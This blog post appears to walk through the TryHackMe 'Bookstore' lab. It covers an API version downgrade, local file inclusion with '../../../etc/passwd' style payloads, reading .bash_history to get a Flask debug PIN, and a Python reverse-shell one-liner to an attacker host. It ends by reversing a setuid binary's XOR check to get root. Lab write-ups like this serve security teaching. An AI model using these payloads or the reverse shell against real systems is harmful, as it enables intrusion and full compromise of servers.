---
layout: post
title: "Tryhackme BookStore Walkthrough - API & Reverse Engineering"
date: 2025-09-03
categories: [ctf, tryhackme, walkthrough]
image: https://miro.medium.com/v2/resize:fit:720/format:webp/1*mZunNj45WXui4CSwhm-Buw.jpeg
permalink: /blog/BookStore-Tryhackme
locked: false
---

<div style="border-left: 4px solid #00d4aa; background: #0f172a; padding: 20px; margin: 20px 0; border-radius: 0 8px 8px 0;">
  <div style="display: flex; justify-content: center; margin-bottom: 15px;">
    <img src="https://assets.tryhackme.com/img/favicon.png" width="48" height="48" alt="TryHackMe" style="border: none; outline: none; box-shadow: none;">
  </div>
  
  <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px; justify-content: center;">
    <h3 style="margin: 0; color: #f1f5f9;">Bookstore</h3>
    <div style="display: flex; align-items: center; gap: 5px;">
      <span style="color: #ff8c00; font-weight: bold;">▁▃▅</span>
      <span style="background: #ff8c00; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold;">MEDIUM</span>
    </div>
  </div>
  
  <p style="margin: 10px 0; color: #cbd5e1;">
    <strong>Objective:</strong> understand how a vulnerable API can be exploited
  </p>
  
  <div style="display: flex; gap: 20px; margin-top: 15px;">
    <span style="color: white; padding: 8px 16px; font-weight: bold;">Web Exploitation</span>
    <a href="https://tryhackme.com/room/bookstoreoc" target="_blank" style="background: #dc2626; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: bold;">🔗 Start Challenge →</a>
  </div>
</div>

---

# Part 1

I accessed the website using its IP address without specifying any port. Once we accessed the website, we found something like this:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dZz6r0GpIlvLJyOO_NtjrA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

I interacted with every possible endpoint on this site. There were different interaction points, such as home.html and login.html, but login.html didn’t do anything.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*RL1nSp0JsykNSXR2OVc45w.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ZK5RpX4w0e9vyi9ECAhSXA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Once I’ve run through every request, I fire up Postman to check what’s really going on under the hood

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ZSQjBSilIAyhEHP3tw1imw.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*7zWbtkQ_rFrG6e5Y6UvZEA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Burp Suite showed us all the requests. One stood out: `/assets/js/api.js`, which dropped the following:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*RzJ3vGZrJ4OMpIhyBd2ZSQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*5vWo0kXEvRSWgY9NO2Fd4Q.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

We can send a request like this: 

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*qBPoafCs51hbE7NgEVHTFQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

But based on api.js, the most important part is this specific comment. `//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.`

Let’s change `/api/v2/resources/books?id=1` to `/api/v1/resources/books?id=1`

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*UQ6kmLhYWDTsYiYdGxGq-A.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

We didn’t get any errors, which means the previous version of this API is still present, and we can access its vulnerability.

Based on the response from `/api/v2/resources/books/random4`, I tried using different parameters, but none of them returned `/etc/passwd` , `author, id, published ,show`


I brute-forced new parameters but kept the value set to `../../../etc/passwd`

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*L_r725GgPuEMnCaPR6km7Q.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Bingo, we found an endpoint called `show`.

<div class="code-block-container">
  <span class="code-lang-tag">/etc/passwd</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-shell">
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
</code></pre>
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*kuHPsCmNFv-3ovS0DWQMSA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

From the `/etc/passwd` response, we found a user sid, which could allow us to read the flag. Based on the challenge question, let’s use `/home/sid/user.txt`

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ci6allc3uiPmwu41l8iXSw.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

# Part 2

At this stage, I began enumerating further, starting with SSH `../../../../home/sid/.ssh/id_rsa`, But I got a 500 Internal Server Error, which I believe is similar to a file not found

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ijcpwpwiJ8humqJs0VtAcg.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Then I made a request to `.bash_history`, and it returned some juicy data:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*m_LR7g9smdG9H2ex6pkjVQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

It returned a debug pin belonging to the Flask localhost console. Let’s make a request to this:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*GRnY0Eg9h8UQDGISAJjFgA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Using the pin from `.bash_history`, we accessed the Flask debug console. Since it allows Python execution, we leveraged it to spawn a reverse shell. [Understanding Reverse Shells – Invicti](https://www.invicti.com/blog/web-security/understanding-reverse-shells/)

<div class="code-block-container">
  <span class="code-lang-tag">Python Debug</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-shell">
import os
os.system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"MY-IP",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
</code></pre>
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ExFkZoJzL-edrtKm7mTDxQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

While searching for the root flag, we found a setuid binary called `try-harder`. Analyzing it with strings revealed it prompts for a password, and on success, spawns `/bin/bash -p` giving us root access.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*1X_NvLYdMo22DM4BNXCurg.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ChcQNzQ9y6FvU2W5O5_qKw.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

I downloaded the file for local analysis in Ghidra, which revealed the following code:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*xSMPDrIP8QUslHRDkxK5fw.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<div class="code-block-container">
  <span class="code-lang-tag">Ghidra</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-shell">
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
</code></pre>
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Ghidra</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-shell">
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
</code></pre>
</div>

The program takes your input `(local_1c)` and XORs it with two constants: `0x1116` and `local_18 (0x5db3)`.

If the result equals `0x5dcd21f4`, you win.

<div class="code-block-container">
  <span class="code-lang-tag">Ghidra</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="learning-shell">
$ python 
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> magic = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3
>>> print(hex(magic), magic)
0x5dcd6d51 1573743953
</code></pre>
</div>

`0x5dcd21f4` -> the target value (what the program checks against).

^ `0x1116` ^ `0x5db3` -> you XOR it back with the constants used in the C code.

XOR is its own inverse, so this neatly recovers the original user_input.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*PNSAqUxRZMvYRdwM9MCivg.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

This gave us a root shell